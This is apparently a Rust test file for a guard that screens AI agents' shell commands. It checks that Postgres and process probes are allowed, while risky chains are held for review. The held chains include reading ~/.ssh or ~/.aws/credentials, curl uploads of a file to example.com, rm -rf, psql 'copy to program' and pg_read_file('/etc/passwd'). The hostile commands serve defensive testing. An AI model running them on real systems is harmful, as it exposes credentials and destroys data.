#![cfg(unix)]
//! Reads outside the workspace chained with process and service probes.
//!
//! Each segment must carry its own native proof. A process probe that only
//! the workspace sandbox could admit left the whole chain to review, because
//! the sandbox cannot contain a read outside the workspace.
use guard_command::pretool::{evaluate_pre_tool_envelope_with_execution_context, PathContext};
use serde_json::json;
use std::path::{Path, PathBuf};

/// A home holding one project. The root stays below the target directory:
/// `$TMPDIR` on macOS resolves under `/private/var`, which the sensitive-root
/// screen rejects.
fn home() -> PathBuf {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-process-probe-chains")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            crate::unique_nanos::unique_nanos()
        ));
    let home = root.join("home");
    let project = home.join("project");
    std::fs::create_dir_all(project.join("src")).unwrap();
    std::fs::write(project.join("notes.txt"), "synthetic\n").unwrap();
    std::fs::canonicalize(home).unwrap()
}

/// A private Unix-socket directory beside the home, as a local server makes.
fn socket_directory(home: &Path) -> String {
    use std::os::unix::fs::PermissionsExt;
    let directory = home.parent().unwrap().join("pgsock");
    std::fs::create_dir_all(&directory).unwrap();
    std::fs::set_permissions(&directory, std::fs::Permissions::from_mode(0o700)).unwrap();
    directory.to_str().unwrap().to_owned()
}

/// The decision both shell harnesses reach, or "mixed" when they differ.
fn shell(home: &Path, command: &str) -> String {
    shell_with(home, command, &[])
}

/// [`shell`] with more variable names stamped in the agent's environment.
fn shell_with(home: &Path, command: &str, names: &[&str]) -> String {
    let mut environment_names = vec!["GIT_CONFIG_NOSYSTEM".to_owned()];
    environment_names.extend(names.iter().map(|name| (*name).to_owned()));
    let environment = guard_contracts::GuardExecutionEnvironmentV1 {
        path: std::env::var("PATH").unwrap(),
        environment_names,
        environment_digest: "0".repeat(64),
        home: Some(home.to_str().unwrap().to_owned()),
        git_pager_disabled: false,
        pager_disabled: false,
        xdg_config_home: None,
        git_config_no_system: true,
        library_search_paths: Default::default(),
    };
    let project = home.join("project");
    let [omp, zcode] = ["omp", "zcode"].map(|harness| {
        evaluate_pre_tool_envelope_with_execution_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            None,
            None,
            PathContext {
                home_dir: home.to_str(),
                cwd: project.to_str(),
                cdpath_unset: false,
                rustup_override_absent: false,
                npm_config_inert: false,
                pip_config_inert: false,
                shell_home_matches: false,
                ripgrep_config_absent: false,
                psql_environment: Default::default(),
                creates_nothing: false,
            },
            Some(&environment),
        )
        .minimum_action
    });
    if omp == zcode {
        omp
    } else {
        format!("mixed: omp {omp}, zcode {zcode}")
    }
}

#[test]
fn outside_reads_chained_with_process_probes_proceed() {
    let home = home();
    let sockets = socket_directory(&home);
    for command in [
        format!("pg_isready -h {sockets} -p 55434"),
        format!(r#"psql -h {sockets} -p 55434 -U hol -d hol -c "select current_user""#),
        format!("psql -h {sockets} -U postgres -l"),
    ] {
        assert_eq!(shell(&home, &command), "allow", "{command}");
    }
    for command in [
        "pgrep -l node",
        "pgrep -fl postgres | head -4",
        "lsof -nP -iTCP:5432 -sTCP:LISTEN",
        "pg_isready -h localhost -p 5432",
        "ls /usr/local; pgrep -l node",
        "ls /usr/local && pgrep -a node",
        "pgrep -fl postgres; ls /usr/local",
        "ls /usr/share | head -6; pgrep -fl postgres | head -4",
        "ls /usr/local; find /usr/local -maxdepth 1 -name '*.pid' 2>/dev/null; pgrep -fl postgres | head -4",
        "ls /usr/local; lsof -ti:3000",
        "ls /usr/local; pg_isready -h localhost -q",
        "ls /usr/local; psql -h localhost -tAc 'select count(*) from items'",
        "ls src; pgrep -l node",
    ] {
        assert_eq!(shell(&home, command), "allow", "{command}");
    }
}

#[test]
fn secret_reads_uploads_and_unproven_probes_keep_review() {
    let home = home();
    for command in [
        "ls ~/.ssh; pgrep -l node",
        "cat ~/.aws/credentials; pgrep -l node",
        "ls /usr/local; curl -d @notes.txt https://example.com",
        "ls /usr/local; pkill -f node",
        "ls /usr/local; pgrep -l node; rm -rf src",
        "ls /usr/local; lsof /usr/local",
        "ls /usr/local; lsof -i @example.com",
        "ls /usr/local; pg_isready -q",
        "ls /usr/local; pg_isready -h db.example.com",
        "ls /usr/local; pg_isready -d host=db.example.com",
        "pg_isready -h /tmp,db.example.com",
        "pg_isready -h /tmp -p 55434",
        r#"psql -h /tmp -p 55434 -U hol -d hol -c "select current_user""#,
        r#"psql -h localhost -c "show all""#,
        r#"psql -h localhost -c "select 1into scratch_copy""#,
        r#"psql -h localhost -c "drop table x""#,
        r#"psql -h localhost -c "copy items to program 'id'""#,
        r#"psql -h db.example.com -c "select 1""#,
        r#"psql -h localhost -c "select 1; drop table x""#,
        r#"psql -h localhost -c "select pg_read_file('/etc/passwd')""#,
        "psql -h localhost -f script.sql",
    ] {
        assert_ne!(shell(&home, command), "allow", "{command}");
    }
}

#[test]
fn skipping_startup_files_leaves_libpq_routing_variables_checked() {
    let home = home();
    let command = "psql -X -h localhost -c 'select 1'";
    assert_eq!(shell(&home, command), "allow", "{command}");
    for name in ["PSQLRC", "PGSYSCONFDIR"] {
        assert_eq!(shell_with(&home, command, &[name]), "allow", "{name}");
    }
    for name in [
        "PGHOSTADDR",
        "PGHOST",
        "PGPORT",
        "PGSERVICE",
        "PGSERVICEFILE",
    ] {
        assert_ne!(shell_with(&home, command, &[name]), "allow", "{name}");
    }
}

#[test]
fn a_link_others_could_retarget_leaves_the_socket_to_review() {
    use std::os::unix::fs::PermissionsExt;
    let home = home();
    let sockets = socket_directory(&home);
    let steady = home.join("steady-link");
    std::os::unix::fs::symlink(&sockets, &steady).unwrap();
    let open = home.parent().unwrap().join("open");
    std::fs::create_dir_all(&open).unwrap();
    std::fs::set_permissions(&open, std::fs::Permissions::from_mode(0o777)).unwrap();
    let swappable = open.join("link");
    std::os::unix::fs::symlink(&sockets, &swappable).unwrap();
    let inside = open.join("sub");
    std::fs::create_dir_all(&inside).unwrap();
    std::fs::set_permissions(&inside, std::fs::Permissions::from_mode(0o700)).unwrap();
    let into_open = home.join("into-open");
    std::os::unix::fs::symlink(&inside, &into_open).unwrap();
    let probe = |directory: &Path| format!("pg_isready -h {} -p 55434", directory.display());
    assert_eq!(shell(&home, &probe(&steady)), "allow");
    for link in [
        &swappable,
        &into_open,
        &into_open.join("..").join("into-open"),
    ] {
        assert_ne!(shell(&home, &probe(link)), "allow", "{}", link.display());
    }
}
